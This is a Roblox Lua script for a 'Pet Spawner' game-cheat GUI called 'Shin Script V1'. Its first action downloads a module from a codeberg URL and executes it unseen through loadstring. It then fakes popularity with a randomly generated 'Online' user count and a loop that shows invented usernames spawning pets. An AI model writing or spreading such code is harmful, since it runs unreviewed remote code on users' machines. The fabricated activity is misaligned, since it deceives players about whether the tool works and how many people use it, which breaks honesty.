local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Load Spawner
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
local Pets = Spawner.GetPets()

-- GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PetSpawnerUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 300)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -150)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- Title Bar
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Title.Text = "Shin Script V1"
Title.TextColor3 = Color3.fromRGB(200, 255, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.ZIndex = 2
Title.Parent = MainFrame

-- Minimize Button
local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Text = "-"
MinimizeBtn.Size = UDim2.new(0, 30, 0, 30)
MinimizeBtn.Position = UDim2.new(1, -30, 0, 0)
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeBtn.Font = Enum.Font.GothamBold
MinimizeBtn.TextSize = 18
MinimizeBtn.ZIndex = 3
MinimizeBtn.Parent = MainFrame

-- Online User Count
local OnlineUsers = Instance.new("TextLabel")
OnlineUsers.Size = UDim2.new(0, 120, 0, 20)
OnlineUsers.Position = UDim2.new(1, -145, 0, 5)
OnlineUsers.BackgroundTransparency = 1
OnlineUsers.TextColor3 = Color3.fromRGB(150, 255, 150)
OnlineUsers.Font = Enum.Font.Gotham
OnlineUsers.TextSize = 12
OnlineUsers.TextXAlignment = Enum.TextXAlignment.Right
OnlineUsers.ZIndex = 2
OnlineUsers.Parent = Title

-- Active Pets Frame
local ActivePetsLabel = Instance.new("TextLabel")
ActivePetsLabel.Text = "Active Pets:"
ActivePetsLabel.Size = UDim2.new(1, -20, 0, 20)
ActivePetsLabel.Position = UDim2.new(0, 10, 0, 35)
ActivePetsLabel.TextColor3 = Color3.new(1,1,1)
ActivePetsLabel.BackgroundTransparency = 1
ActivePetsLabel.Font = Enum.Font.Gotham
ActivePetsLabel.TextSize = 14
ActivePetsLabel.Parent = MainFrame

local ActivePetsFrame = Instance.new("Frame")
ActivePetsFrame.Size = UDim2.new(1, -20, 0, 100)
ActivePetsFrame.Position = UDim2.new(0, 10, 0, 60)
ActivePetsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ActivePetsFrame.BorderSizePixel = 0
ActivePetsFrame.ClipsDescendants = true
ActivePetsFrame.Parent = MainFrame

local UIList = Instance.new("UIListLayout")
UIList.Padding = UDim.new(0, 2)
UIList.Parent = ActivePetsFrame

-- Input boxes & notification
local function createTextInput(labelText, placeholder, yOffset)
    local label = Instance.new("TextLabel")
    label.Text = labelText
    label.Position = UDim2.new(0, 10, 0, yOffset)
    label.Size = UDim2.new(0, 120, 0, 20)
    label.TextColor3 = Color3.new(1,1,1)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Gotham
    label.TextSize = 12
    label.Parent = MainFrame

    local input = Instance.new("TextBox")
    input.Position = UDim2.new(0, 10, 0, yOffset + 20)
    input.Size = UDim2.new(1, -20, 0, 25)
    input.PlaceholderText = placeholder
    input.BackgroundColor3 = Color3.fromRGB(50,50,50)
    input.TextColor3 = Color3.new(1,1,1)
    input.Font = Enum.Font.Gotham
    input.TextSize = 14
    input.Parent = MainFrame

    return input
end

local PetNameInput = createTextInput("Pet Name:", "Enter Pet Name", 170)
local KgInput = createTextInput("Weight (kg):", "1‑10", 210)
local AgeInput = createTextInput("Age:", "1‑15", 250)

local NotificationBar = Instance.new("TextLabel")
NotificationBar.Size = UDim2.new(1, 0, 0, 20)
NotificationBar.Position = UDim2.new(0, 0, 1, -30)
NotificationBar.BackgroundColor3 = Color3.fromRGB(25,25,25)
NotificationBar.TextColor3 = Color3.fromRGB(180,255,180)
NotificationBar.Font = Enum.Font.Gotham
NotificationBar.TextSize = 14
NotificationBar.ZIndex = 1
NotificationBar.Text = ""
NotificationBar.Parent = MainFrame

local SpawnBtn = Instance.new("TextButton")
SpawnBtn.Text = "Spawn Pet"
SpawnBtn.Size = UDim2.new(1, -20, 0, 30)
SpawnBtn.Position = UDim2.new(0, 10, 0, 290)
SpawnBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
SpawnBtn.TextColor3 = Color3.new(1,1,1)
SpawnBtn.Font = Enum.Font.GothamSemibold
SpawnBtn.TextSize = 14
SpawnBtn.Parent = MainFrame

-- Utility: add entry to active list
local function addActiveEntry(name, petName, kg, age)
    local entry = Instance.new("TextLabel")
    entry.Size = UDim2.new(1, 0, 0, 20)
    entry.BackgroundTransparency = 1
    entry.TextColor3 = Color3.new(0.8,1,0.8)
    entry.Font = Enum.Font.Gotham
    entry.TextSize = 12
    entry.Text = name.." spawned a "..petName.." ("..kg.."kg, "..age.."y)"
    entry.Parent = ActivePetsFrame

    -- remove older entries to limit list
    task.delay(30, function()
        entry:Destroy()
    end)
end

SpawnBtn.MouseButton1Click:Connect(function()
    local petName = PetNameInput.Text
    local kg = tonumber(KgInput.Text) or 1
    local age = tonumber(AgeInput.Text) or 1
    if petName=="" then
        NotificationBar.Text="Enter a valid pet name."
        return
    end
    Spawner.SpawnPet(petName, kg, age)
    NotificationBar.Text = Player.Name.." spawned a "..petName.." ("..kg.."kg, "..age.."y)"
    addActiveEntry(Player.Name, petName, kg, age)
end)

local isMinimized = false
MinimizeBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        for _, c in pairs(MainFrame:GetChildren()) do
            if c~=Title and c~=MinimizeBtn then c.Visible=false end
        end
        MainFrame.Size=UDim2.new(0,350,0,30)
    else
        for _, c in pairs(MainFrame:GetChildren()) do c.Visible=true end
        MainFrame.Size=UDim2.new(0,350,0,300)
    end
end)

-- Simulated dynamic online count
local fakeOnline = #Players:GetPlayers() + math.random(10,20)
task.spawn(function()
    while true do
        task.wait(math.random(3,6))
        fakeOnline = math.clamp(fakeOnline + math.random(-3,5), 20, 500)
        OnlineUsers.Text="Online: "..fakeOnline
    end
end)

-- Fake bot spawn using real garden pets
local fakeUsers = {"GhostWizard","LuckyPine","FunkyKoala","SneakyCarrot","MossyFox","RaccoonWar","MagicPotato","ChocoPeng","SageLily","TinyClover","PetalFang","LeafWhisker","BambooKnight","TofuTiger"}

task.spawn(function()
    while true do
        task.wait(math.random(5,8))
        local bot = fakeUsers[math.random(#fakeUsers)]
        local pet = Pets[math.random(#Pets)]
        local kg = math.random(1,5)
        local age = math.random(1,10)
        NotificationBar.Text = bot.." spawned a "..pet.." ("..kg.."kg, "..age.."y)"
        addActiveEntry(bot, pet, kg, age)
    end
end)
